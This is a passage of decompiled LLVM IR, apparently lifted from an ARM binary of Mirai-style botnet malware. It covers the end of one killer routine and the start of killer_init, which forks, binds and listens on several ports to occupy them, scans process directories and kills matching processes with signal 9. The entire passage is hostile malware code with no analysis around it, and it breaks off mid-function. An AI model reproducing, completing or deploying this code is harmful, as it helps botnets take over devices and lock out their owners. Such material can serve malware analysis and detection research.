  store i32 %v2_cd64, i32* @r6, align 4
  %v2_cd68 = icmp eq i32 %v2_cd64, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9f0, i32* @r0, align 4
  br i1 %v2_cd68, label %dec_label_pc_ce68, label %dec_label_pc_cd78thread-pre-split

dec_label_pc_cd78thread-pre-split:                ; preds = %dec_label_pc_cd60.preheader, %dec_label_pc_cd60.loopexit
  %v0_cd78.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_cd78

dec_label_pc_cd78:                                ; preds = %dec_label_pc_cd78thread-pre-split, %dec_label_pc_ce40
  %v0_cd78 = phi i32 [ %v0_cd78.pr, %dec_label_pc_cd78thread-pre-split ], [ 1, %dec_label_pc_ce40 ]
  %v2_cd78 = icmp eq i32 %v0_cd78, 0
  br i1 %v2_cd78, label %dec_label_pc_cd80, label %dec_label_pc_ce68

dec_label_pc_cd80:                                ; preds = %dec_label_pc_cd78
  %v0_cd80 = call i32 @util_zero()
  %v0_cd84 = load i32, i32* @r5, align 4
  %v2_cd8c = inttoptr i32 %v0_cd84 to i32*
  %v3_cd8c = call i32 @table_retrieve_val(i32 15, i32* %v2_cd8c)
  store i32 %v2_ca00, i32* @r0, align 4
  %v3_cd98 = call i32 @util_strcpy(i8* %v3_ca24, i32 %v3_cd8c)
  %v2_cda0 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cda4 = load i32, i32* @r7, align 4
  %v1_cda8 = load i32, i32* @sl, align 4
  %v2_cda8 = add i32 %v1_cda8, %v2_cda0
  store i32 %v2_cda8, i32* @r0, align 4
  %v2_cdac = inttoptr i32 %v2_cda8 to i8*
  %v3_cdac = call i32 @util_strcpy(i8* %v2_cdac, i32 %v0_cda4)
  %v2_cdb4 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cdb8 = load i32, i32* @r5, align 4
  store i32 %v2_cdb4, i32* @r4, align 4
  %v2_cdc4 = inttoptr i32 %v0_cdb8 to i32*
  %v3_cdc4 = call i32 @table_retrieve_val(i32 17, i32* %v2_cdc4)
  %v0_cdcc = load i32, i32* @r4, align 4
  %v1_cdcc = load i32, i32* @sl, align 4
  %v2_cdcc = add i32 %v1_cdcc, %v0_cdcc
  store i32 %v2_cdcc, i32* @r0, align 4
  %v2_cdd0 = inttoptr i32 %v2_cdcc to i8*
  %v3_cdd0 = call i32 @util_strcpy(i8* %v2_cdd0, i32 %v3_cdc4)
  %v2_cdd8 = call i32 @util_strlen(i8* %v3_ca24)
  %v1_cde0 = load i32, i32* @sl, align 4
  %v2_cde0 = add i32 %v1_cde0, %v2_cdd8
  store i32 %v2_cde0, i32* @r0, align 4
  %v2_cde4 = inttoptr i32 %v2_cde0 to i8*
  %v3_cde4 = call i32 @util_strcpy(i8* %v2_cde4, i32 ptrtoint (i32* @global_var_19a78.73 to i32))
  %v2_cdec = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cdf0 = load i32, i32* @r6, align 4
  %v1_cdf0 = add i32 %v0_cdf0, 11
  %v1_cdf4 = load i32, i32* @sl, align 4
  %v2_cdf4 = add i32 %v1_cdf4, %v2_cdec
  store i32 %v2_cdf4, i32* @r0, align 4
  %v2_cdf8 = inttoptr i32 %v2_cdf4 to i8*
  %v3_cdf8 = call i32 @util_strcpy(i8* %v2_cdf8, i32 %v1_cdf0)
  %v3_ce08 = call i32 @readlink(i32 %v2_ca00, i32 %v2_c9f0, i32 4096)
  %v7_ce0c = icmp eq i32 %v3_ce08, -1
  br i1 %v7_ce0c, label %dec_label_pc_cd60.loopexit, label %dec_label_pc_ce18

dec_label_pc_ce18:                                ; preds = %dec_label_pc_cd80
  %v2_ce18 = call i32 @util_strlen(i8* %v3_ca10)
  store i32 %v2_ce18, i32* @r1, align 4
  %v4_ce2c = call i32 @util_stristr(i8* %v3_ca10, i32 %v2_ce18, i32 %v2_cc3c.pre-phi)
  %v7_ce30 = icmp eq i32 %v4_ce2c, -1
  br i1 %v7_ce30, label %dec_label_pc_cd60.loopexit, label %dec_label_pc_ce40

dec_label_pc_ce40:                                ; preds = %dec_label_pc_ce18
  %v0_ce38 = load i32, i32* @r7, align 4
  %v2_ce40 = inttoptr i32 %v0_ce38 to i8*
  %v3_ce40 = call i32 @util_atoi(i8* %v2_ce40, i32 10)
  %v2_ce48 = call i32 @kill(i32 %v3_ce40, i32 9)
  %v0_ce4c = load i32, i32* @r8, align 4
  %v1_ce50 = inttoptr i32 %v0_ce4c to i32*
  %v2_ce50 = call i32 @__GI_readdir(i32* %v1_ce50)
  store i32 %v2_ce50, i32* @r6, align 4
  %v2_ce54 = icmp eq i32 %v2_ce50, 0
  store i32 1, i32* @r5, align 4
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9f0, i32* @r0, align 4
  br i1 %v2_ce54, label %dec_label_pc_ce68, label %dec_label_pc_cd78

dec_label_pc_ce68:                                ; preds = %dec_label_pc_cd60.loopexit, %dec_label_pc_ce40, %dec_label_pc_cd78, %dec_label_pc_cd60.preheader
  %v0_ce68 = load i32, i32* @r8, align 4
  %v1_ce6c = inttoptr i32 %v0_ce68 to i32*
  %v2_ce6c = call i32 @__GI_closedir(i32* %v1_ce6c)
  %v0_ce70 = load i32, i32* @sb, align 4
  %v1_ce74 = inttoptr i32 %v0_ce70 to i32*
  %v2_ce74 = call i32 @__GI_readdir(i32* %v1_ce74)
  %v2_ce78 = icmp eq i32 %v2_ce74, 0
  br i1 %v2_ce78, label %dec_label_pc_ce80, label %dec_label_pc_cc7c

dec_label_pc_ce80:                                ; preds = %dec_label_pc_cc6c.loopexit, %dec_label_pc_ce68, %dec_label_pc_cc7c, %dec_label_pc_cc6c.preheader
  %v0_ce80 = load i32, i32* @sb, align 4
  %v1_ce84 = inttoptr i32 %v0_ce80 to i32*
  %v2_ce84 = call i32 @__GI_closedir(i32* %v1_ce84)
  %v0_ce88 = load i32, i32* @r5, align 4
  %v1_ce88 = urem i32 %v0_ce88, 256
  br label %dec_label_pc_ce8c

dec_label_pc_ce8c:                                ; preds = %dec_label_pc_cc4c, %dec_label_pc_ce80
  %storemerge = phi i32 [ %v1_ce88, %dec_label_pc_ce80 ], [ 0, %dec_label_pc_cc4c ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_ce90 = call i32 @sleep(i32 1)
  %v1_ce98 = call i32 @table_lock_val(i32 15)
  %v1_cea0 = call i32 @table_lock_val(i32 16)
  %v1_cea8 = call i32 @table_lock_val(i32 17)
  br label %dec_label_pc_ceac

dec_label_pc_ceac:                                ; preds = %bb, %dec_label_pc_ceec, %dec_label_pc_ce8c
  %v0_ceac = load i32, i32* @r4, align 4
  store i32 %v3_c9a8, i32* @r4, align 4
  store i32 %v6_c9a8, i32* @r5, align 4
  store i32 %v9_c9a8, i32* @r6, align 4
  store i32 %v12_c9a8, i32* @r7, align 4
  store i32 %v15_c9a8, i32* @r8, align 4
  store i32 %v18_c9a8, i32* @sb, align 4
  store i32 %v21_c9a8, i32* @sl, align 4
  store i32 %v24_c9a8, i32* @fp, align 4
  store i32 %v27_c9a8, i32* @lr, align 4
  ret i32 %v0_ceac

dec_label_pc_cec0:                                ; preds = %dec_label_pc_cba0
  %v1_cec0 = add i32 %v0_cec0, 1
  %v7_cec4 = icmp eq i32 %v0_cec0, 0
  br i1 %v7_cec4, label %dec_label_pc_cecc, label %dec_label_pc_cba8

dec_label_pc_cecc:                                ; preds = %dec_label_pc_cec0
  %v1_cecc = add i32 %v0_cbb0, 3
  %v2_cecc = inttoptr i32 %v1_cecc to i8*
  %v3_cecc = load i8, i8* %v2_cecc, align 1
  %v7_ced0 = icmp eq i8 %v3_cecc, 65
  br i1 %v7_ced0, label %dec_label_pc_cee4, label %dec_label_pc_ced8

dec_label_pc_ced8:                                ; preds = %dec_label_pc_cecc, %dec_label_pc_cee4
  %v0_cbb882 = phi i32 [ %v0_cbb883, %dec_label_pc_cecc ], [ 1, %dec_label_pc_cee4 ]
  br label %dec_label_pc_cb80.backedge

dec_label_pc_cb80.backedge:                       ; preds = %dec_label_pc_ced8, %dec_label_pc_cbac
  %v0_cbb881 = phi i32 [ %v0_cbb882, %dec_label_pc_ced8 ], [ %v0_cbb883, %dec_label_pc_cbac ]
  %v0_cec073 = phi i32 [ %v1_cec0, %dec_label_pc_ced8 ], [ %v0_cbac, %dec_label_pc_cbac ]
  %v0_cba0.pr70 = phi i32 [ 0, %dec_label_pc_ced8 ], [ %v0_cba0.pr71, %dec_label_pc_cbac ]
  %v0_cb80 = add i32 %v0_cbb0, 1
  %v1_cb80 = add i32 %v0_cbb0, 3
  %v2_cb80 = inttoptr i32 %v1_cb80 to i8*
  %v3_cb80 = load i8, i8* %v2_cb80, align 1
  %v4_cb80 = zext i8 %v3_cb80 to i32
  store i32 %v4_cb80, i32* @r3, align 4
  %v2_cb84 = icmp eq i8 %v3_cb80, 0
  %v1_cb88 = add i32 %v0_cb8878, 1
  br i1 %v2_cb84, label %dec_label_pc_cbb8, label %dec_label_pc_cb90

dec_label_pc_cee4:                                ; preds = %dec_label_pc_cecc
  store i32 1, i32* @lr, align 4
  br label %dec_label_pc_ced8

dec_label_pc_ceec:                                ; preds = %dec_label_pc_cc30
  %v1_cef0 = call i32 @table_lock_val(i32 15)
  %v1_cef8 = call i32 @table_lock_val(i32 16)
  %v1_cf00 = call i32 @table_lock_val(i32 17)
  %v1_cf08 = call i32 @table_lock_val(i32 19)
  br label %dec_label_pc_ceac

dec_label_pc_cf10:                                ; preds = %entry
  store i8 48, i8* %stack_var_-72, align 1
  br label %dec_label_pc_ca54

; uselistorder directives
  uselistorder i32 %v1_cb88, { 1, 0 }
  uselistorder i32 %v4_cb80, { 1, 0 }
  uselistorder i32 %v0_cbb881, { 1, 0 }
  uselistorder i32 %v1_cec0, { 1, 0 }
  uselistorder i32 %v2_ce74, { 1, 0 }
  uselistorder i32 %v1_cbe4, { 1, 0 }
  uselistorder i32 %v0_cbf030, { 1, 0 }
  uselistorder i32 %v1_cc08, { 0, 3, 1, 2 }
  uselistorder i32 %v0_cbac, { 1, 0 }
  uselistorder i32 %v0_cb8878, { 1, 0 }
  uselistorder i32 %v0_cec0, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_cbb883, { 1, 2, 0 }
  uselistorder i32 %v1_cb8854, { 1, 0 }
  uselistorder i32 %v2_cb6c, { 1, 0 }
  uselistorder i32 %v1_cb68, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_cb28, { 0, 2, 1 }
  uselistorder i32 %v0_cb2816, { 1, 0 }
  uselistorder i32 %v1_caf4, { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i32 %v2_ca84, { 1, 2, 0 }
  uselistorder i32 %v0_ca2c, { 1, 0 }
  uselistorder i32 %v2_ca28, { 1, 0, 2 }
  uselistorder i8* %v3_ca10, { 1, 0, 2 }
  uselistorder i32 %v2_c9f0, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8* %stack_var_-585, { 1, 4, 0, 2, 3 }
  uselistorder i8* %stack_var_-72, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32, i32)* @util_fdgets, { 1, 0 }
  uselistorder label %dec_label_pc_ced8, { 1, 0 }
  uselistorder label %dec_label_pc_ceac, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ce8c, { 1, 0 }
  uselistorder label %dec_label_pc_ce80, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ce68, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_cd78, { 1, 0 }
  uselistorder label %dec_label_pc_cd78thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_cd60.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_cc7c, { 1, 0 }
  uselistorder label %dec_label_pc_cc7c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_cc6c.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cc04, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cbac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cb90, { 1, 0 }
  uselistorder label %dec_label_pc_cb34, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_ca98.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_cae8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_cab0, { 1, 0 }
  uselistorder label %dec_label_pc_ca54, { 1, 0 }
}

define i32 @killer_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-8416 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-4264 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-256 = alloca i32, align 4
  %v3_cf3c = load i32, i32* @r4, align 4
  %v6_cf3c = load i32, i32* @r5, align 4
  %v9_cf3c = load i32, i32* @r6, align 4
  %v12_cf3c = load i32, i32* @r7, align 4
  %v15_cf3c = load i32, i32* @r8, align 4
  %v18_cf3c = load i32, i32* @sb, align 4
  %v21_cf3c = load i32, i32* @sl, align 4
  %v24_cf3c = load i32, i32* @fp, align 4
  %v27_cf3c = load i32, i32* @lr, align 4
  %v2_cf4c = call i32 @__GI_time(i32* null)
  store i32 %v2_cf4c, i32* @r7, align 4
  %v0_cf54 = call i32 @__libc_fork()
  %v7_cf58 = icmp eq i32 %v0_cf54, -1
  %. = zext i1 %v7_cf58 to i32
  %tmp251 = icmp slt i32 %v0_cf54, 1
  %storemerge212 = select i1 %tmp251, i32 %., i32 1
  store i32 %storemerge212, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_24f48.71 to i32), i32* %r3.global-to-local, align 4
  %v2_cf74 = icmp eq i32 %storemerge212, 0
  store i32 %v0_cf54, i32* @global_var_24f48.71, align 4
  br i1 %v2_cf74, label %dec_label_pc_cf90, label %dec_label_pc_cf80

dec_label_pc_cf80:                                ; preds = %dec_label_pc_d234, %dec_label_pc_d118, %entry
  %v1_cf8c = phi i32 [ %v2_d1d0, %dec_label_pc_d118 ], [ %v0_cf54, %entry ], [ 0, %dec_label_pc_d234 ]
  store i32 %v3_cf3c, i32* @r4, align 4
  store i32 %v6_cf3c, i32* @r5, align 4
  store i32 %v9_cf3c, i32* @r6, align 4
  store i32 %v12_cf3c, i32* @r7, align 4
  store i32 %v15_cf3c, i32* @r8, align 4
  store i32 %v18_cf3c, i32* @sb, align 4
  store i32 %v21_cf3c, i32* @sl, align 4
  store i32 %v24_cf3c, i32* @fp, align 4
  store i32 %v27_cf3c, i32* @lr, align 4
  ret i32 %v1_cf8c

dec_label_pc_cf90:                                ; preds = %entry
  %v2_cf90 = ptrtoint i32* %stack_var_-256 to i32
  store i32 %v2_cf90, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-80, align 4
  %v1_cfa8 = call i32 @killer_kill_by_port(i32 58811)
  store i32 -6725, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_cfc0 = load i32, i32* @r5, align 4
  store i32 %v0_cfc0, i32* %r2.global-to-local, align 4
  %v3_cfc8 = call i32 @socket(i32 2, i32 1, i32 %v0_cfc0)
  %v7_cfcc = icmp eq i32 %v3_cfc8, -1
  store i32 %v3_cfc8, i32* @r4, align 4
  br i1 %v7_cfcc, label %dec_label_pc_cff4, label %dec_label_pc_cfd8

dec_label_pc_cfd8:                                ; preds = %dec_label_pc_cf90
  %v2_cfdc = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_cfdc, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_cfe4 = call i32 @bind(i32 %v3_cfc8, i32 %v2_cfdc, i32 16)
  %v0_cfe8 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_cff0 = call i32 @listen(i32 %v0_cfe8, i32 1)
  br label %dec_label_pc_cff4

dec_label_pc_cff4:                                ; preds = %dec_label_pc_cf90, %dec_label_pc_cfd8
  %v2_cffc = call i32 @killer_kill_by_port(i32 ptrtoint ([3 x i8]* @global_var_c707.75 to i32))
  store i32 -14585, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d014 = load i32, i32* @r5, align 4
  store i32 %v0_d014, i32* %r2.global-to-local, align 4
  %v3_d01c = call i32 @socket(i32 2, i32 1, i32 %v0_d014)
  %v7_d020 = icmp eq i32 %v3_d01c, -1
  store i32 %v3_d01c, i32* %r4.global-to-local, align 4
  br i1 %v7_d020, label %dec_label_pc_d048, label %dec_label_pc_d02c

dec_label_pc_d02c:                                ; preds = %dec_label_pc_cff4
  %v2_d030 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_d030, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d038 = call i32 @bind(i32 %v3_d01c, i32 %v2_d030, i32 16)
  %v0_d03c = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d044 = call i32 @listen(i32 %v0_d03c, i32 1)
  br label %dec_label_pc_d048

dec_label_pc_d048:                                ; preds = %dec_label_pc_cff4, %dec_label_pc_d02c
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d050 = load i32, i32* @r5, align 4
  store i32 %v0_d050, i32* %r2.global-to-local, align 4
  %v3_d054 = call i32 @socket(i32 2, i32 1, i32 %v0_d050)
  %v7_d058 = icmp eq i32 %v3_d054, -1
  store i32 %v3_d054, i32* @r4, align 4
  br i1 %v7_d058, label %dec_label_pc_d080, label %dec_label_pc_d064

dec_label_pc_d064:                                ; preds = %dec_label_pc_d048
  %v2_d068 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_d068, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d070 = call i32 @bind(i32 %v3_d054, i32 %v2_d068, i32 16)
  %v0_d074 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d07c = call i32 @listen(i32 %v0_d074, i32 1)
  br label %dec_label_pc_d080

dec_label_pc_d080:                                ; preds = %dec_label_pc_d048, %dec_label_pc_d064
  %v1_d084 = call i32 @killer_kill_by_port(i32 5632)
  store i32 %v2_cf90, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d098 = load i32, i32* @r5, align 4
  store i32 %v0_d098, i32* %r2.global-to-local, align 4
  %v3_d0a0 = call i32 @socket(i32 2, i32 1, i32 %v0_d098)
  %v7_d0a4 = icmp eq i32 %v3_d0a0, -1
  store i32 %v3_d0a0, i32* @r4, align 4
  br i1 %v7_d0a4, label %dec_label_pc_d0cc, label %dec_label_pc_d0b0

dec_label_pc_d0b0:                                ; preds = %dec_label_pc_d080
  %v2_d0b4 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_d0b4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d0bc = call i32 @bind(i32 %v3_d0a0, i32 %v2_d0b4, i32 16)
  %v0_d0c0 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d0c8 = call i32 @listen(i32 %v0_d0c0, i32 1)
  br label %dec_label_pc_d0cc

dec_label_pc_d0cc:                                ; preds = %dec_label_pc_d080, %dec_label_pc_d0b0
  %v1_d0d0 = call i32 @killer_kill_by_port(i32 5888)
  store i32 %v2_cf90, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d0e4 = load i32, i32* @r5, align 4
  store i32 %v0_d0e4, i32* %r2.global-to-local, align 4
  %v3_d0ec = call i32 @socket(i32 2, i32 1, i32 %v0_d0e4)
  %v7_d0f0 = icmp eq i32 %v3_d0ec, -1
  store i32 %v3_d0ec, i32* @r4, align 4
  br i1 %v7_d0f0, label %dec_label_pc_d118, label %dec_label_pc_d0fc

dec_label_pc_d0fc:                                ; preds = %dec_label_pc_d0cc
  %v2_d100 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_d100, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d108 = call i32 @bind(i32 %v3_d0ec, i32 %v2_d100, i32 16)
  %v0_d10c = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d114 = call i32 @listen(i32 %v0_d10c, i32 1)
  br label %dec_label_pc_d118

dec_label_pc_d118:                                ; preds = %dec_label_pc_d0cc, %dec_label_pc_d0fc
  %v1_d11c = call i32 @sleep(i32 5)
  store i32 4096, i32* @r0, align 4
  %v0_d124 = call i32 @malloc()
  store i32 ptrtoint (i32* @global_var_22428.77 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24f44.79 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_d124, i32* %r2.global-to-local, align 4
  %v0_d134 = load i32, i32* @r5, align 4
  %v1_d134 = trunc i32 %v0_d134 to i8
  %v3_d134 = inttoptr i32 %v0_d124 to i8*
  store i8 %v1_d134, i8* %v3_d134, align 1
  %v0_d13c = load i32, i32* @r5, align 4
  %v1_d13c = load i32, i32* %r3.global-to-local, align 4
  %v2_d13c = inttoptr i32 %v1_d13c to i32*
  store i32 %v0_d13c, i32* %v2_d13c, align 4
  %v0_d140 = load i32, i32* %r2.global-to-local, align 4
  %v1_d140 = load i32, i32* %r1.global-to-local, align 4
  %v2_d140 = inttoptr i32 %v1_d140 to i32*
  store i32 %v0_d140, i32* %v2_d140, align 4
  %v1_d144 = call i32 @table_unlock_val(i32 15)
  %v1_d14c = call i32 @table_unlock_val(i32 16)
  %v2_d154 = ptrtoint i32* %stack_var_-4264 to i32
  store i32 %v2_d154, i32* %r2.global-to-local, align 4
  %v0_d158 = load i32, i32* @r5, align 4
  store i32 %v0_d158, i32* %r1.global-to-local, align 4
  %v2_d164 = inttoptr i32 %v0_d158 to i32*
  %v3_d164 = call i32 @table_retrieve_val(i32 15, i32* %v2_d164)
  %v1_d16c = add i32 %v2_d154, -56
  store i32 %v1_d16c, i32* %r3.global-to-local, align 4
  store i32 %v3_d164, i32* %r1.global-to-local, align 4
  store i32 %v1_d16c, i32* @r0, align 4
  %v2_d17c = inttoptr i32 %v1_d16c to i8*
  %v3_d17c = call i32 @util_strcpy(i8* %v2_d17c, i32 %v3_d164)
  %v2_d184 = add i32 %v3_d17c, %v1_d16c
  store i32 %v2_d184, i32* @r4, align 4
  %v1_d188 = call i32 @__getpid(i32 %v3_d17c)
  %v2_d190 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_d190, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_d198 = trunc i32 %v1_d188 to i8
  %v4_d198 = call i32 @util_itoa(i8 %v3_d198, i32 10, i32 %v2_d190)
  store i32 %v4_d198, i32* %r1.global-to-local, align 4
  %v0_d1a0 = load i32, i32* @r4, align 4
  store i32 %v0_d1a0, i32* @r0, align 4
  %v2_d1a4 = inttoptr i32 %v0_d1a0 to i8*
  %v3_d1a4 = call i32 @util_strcpy(i8* %v2_d1a4, i32 %v4_d198)
  %v0_d1a8 = load i32, i32* @r5, align 4
  store i32 %v0_d1a8, i32* %r1.global-to-local, align 4
  %v1_d1ac = load i32, i32* @r4, align 4
  %v2_d1ac = add i32 %v1_d1ac, %v3_d1a4
  store i32 %v2_d1ac, i32* @r4, align 4
  %v2_d1b4 = inttoptr i32 %v0_d1a8 to i32*
  %v3_d1b4 = call i32 @table_retrieve_val(i32 16, i32* %v2_d1b4)
  store i32 %v3_d1b4, i32* %r1.global-to-local, align 4
  %v0_d1bc = load i32, i32* @r4, align 4
  store i32 %v0_d1bc, i32* @r0, align 4
  %v2_d1c0 = inttoptr i32 %v0_d1bc to i8*
  %v3_d1c0 = call i32 @util_strcpy(i8* %v2_d1c0, i32 %v3_d1b4)
  %v0_d1c4 = load i32, i32* @r5, align 4
  store i32 %v0_d1c4, i32* %r1.global-to-local, align 4
  store i32 %v3_d1c0, i32* @r6, align 4
  %v2_d1d0 = call i32 @__libc_open(i32 %v1_d16c, i32 %v0_d1c4)
  %v7_d1d4 = icmp eq i32 %v2_d1d0, -1
  br i1 %v7_d1d4, label %dec_label_pc_cf80, label %dec_label_pc_d1dc

dec_label_pc_d1dc:                                ; preds = %dec_label_pc_d118
  %v1_d1dc = call i32 @__GI___libc_close(i32 %v2_d1d0)
  %v1_d1e4 = call i32 @table_lock_val(i32 15)
  %v1_d1ec = call i32 @table_lock_val(i32 16)
  store i32 ptrtoint (i32* @global_var_24f44.79 to i32), i32* %r3.global-to-local, align 4
  %v2_d1f8 = load i32, i32* @global_var_24f44.79, align 4
  store i32 %v2_d1f8, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_d204 = call i32 @readlink(i32 %v1_d16c, i32 %v2_d1f8, i32 4095)
  %v7_d208 = icmp eq i32 %v3_d204, -1
  br i1 %v7_d208, label %.thread9, label %bb254

bb254:                                            ; preds = %dec_label_pc_d1dc
  %v3_d210 = load i32, i32* @global_var_24f44.79, align 4
  store i32 %v3_d210, i32* %r3.global-to-local, align 4
  %v1_d214 = load i32, i32* @r5, align 4
  %v2_d214 = trunc i32 %v1_d214 to i8
  %v5_d214 = add i32 %v3_d210, %v3_d204
  %v6_d214 = inttoptr i32 %v5_d214 to i8*
  store i8 %v2_d214, i8* %v6_d214, align 1
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_d1dc, %bb254
  store i32 %v1_d16c, i32* @r0, align 4
  %v0_d21c = load i32, i32* @r6, align 4
  %v1_d21c = load i32, i32* @r4, align 4
  %v1_d16c.neg = sub i32 56, %v2_d154
  %v2_d21c = add i32 %v1_d16c.neg, %v0_d21c
  %v2_d220 = add i32 %v2_d21c, %v1_d21c
  store i32 %v2_d220, i32* @r1, align 4
  %v0_d224 = call i32 @util_zero()
  %v0_d228 = load i32, i32* @r7, align 4
  store i32 %v0_d228, i32* @r4, align 4
  %v0_d22c = load i32, i32* @r5, align 4
  store i32 400, i32* @r5, align 4
  %v2_d334 = ptrtoint i32* %stack_var_-160 to i32
  %v2_d340 = bitcast i32* %stack_var_-160 to i8*
  %v2_d384 = ptrtoint i32* %stack_var_-224 to i32
  %v2_d388 = bitcast i32* %stack_var_-224 to i8*
  %v2_d4f4 = ptrtoint i32* %stack_var_-44 to i32
  %v2_d504 = ptrtoint i32* %stack_var_-48 to i32
  %v2_d518 = ptrtoint i32* %stack_var_-52 to i32
  %v2_d52c = ptrtoint i32* %stack_var_-56 to i32
  %v2_d53c = ptrtoint i32* %stack_var_-64 to i32
  %v2_d544 = ptrtoint i32* %stack_var_-60 to i32
  %v2_d568 = ptrtoint i32* %stack_var_-8416 to i32
  br label %dec_label_pc_d234

dec_label_pc_d234:                                ; preds = %dec_label_pc_d2fc, %.thread9
  %stack_var_-8436.0 = phi i32 [ %v0_d22c, %.thread9 ], [ %stack_var_-8436.3, %dec_label_pc_d2fc ]
  %v1_d238 = call i32 @table_unlock_val(i32 15)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d244 = call i32 @table_retrieve_val(i32 15, i32* null)
  %v1_d248 = call i32 @__GI_opendir(i32 %v3_d244)
  store i32 %v1_d248, i32* @r8, align 4
  %v2_d24c = icmp eq i32 %v1_d248, 0
  br i1 %v2_d24c, label %dec_label_pc_cf80, label %dec_label_pc_d254

dec_label_pc_d254:                                ; preds = %dec_label_pc_d234
  %v1_d258 = call i32 @table_lock_val(i32 15)
  %v0_d25c139 = load i32, i32* @r8, align 4
  %v1_d260140 = inttoptr i32 %v0_d25c139 to i32*
  %v2_d260141 = call i32 @__GI_readdir(i32* %v1_d260140)
  %v2_d264143 = icmp eq i32 %v2_d260141, 0
  br i1 %v2_d264143, label %dec_label_pc_d2fc, label %dec_label_pc_d26c.preheader

dec_label_pc_d26c.preheader:                      ; preds = %dec_label_pc_d254, %dec_label_pc_d25c.backedge
  %v0_d26c155 = phi i32 [ %v2_d260, %dec_label_pc_d25c.backedge ], [ %v2_d260141, %dec_label_pc_d254 ]
  %stack_var_-8436.1144 = phi i32 [ %stack_var_-8436.1.be, %dec_label_pc_d25c.backedge ], [ %stack_var_-8436.0, %dec_label_pc_d254 ]
  br label %dec_label_pc_d26c

dec_label_pc_d26c:                                ; preds = %dec_label_pc_d26c.preheader, %dec_label_pc_d2e4
  %v0_d27c = phi i32 [ %v2_d2f0, %dec_label_pc_d2e4 ], [ %v0_d26c155, %dec_label_pc_d26c.preheader ]
  %stack_var_-8436.2 = phi i32 [ %v1_d290, %dec_label_pc_d2e4 ], [ %stack_var_-8436.1144, %dec_label_pc_d26c.preheader ]
  %v1_d26c = add i32 %v0_d27c, 11
  %v2_d26c = inttoptr i32 %v1_d26c to i8*
  %v3_d26c = load i8, i8* %v2_d26c, align 1
  %v4_d26c = zext i8 %v3_d26c to i32
  %v1_d270 = add nsw i32 %v4_d26c, -48
  store i32 %v1_d270, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_d270, 9
  br i1 %tmp, label %dec_label_pc_d25c.backedge, label %dec_label_pc_d27c

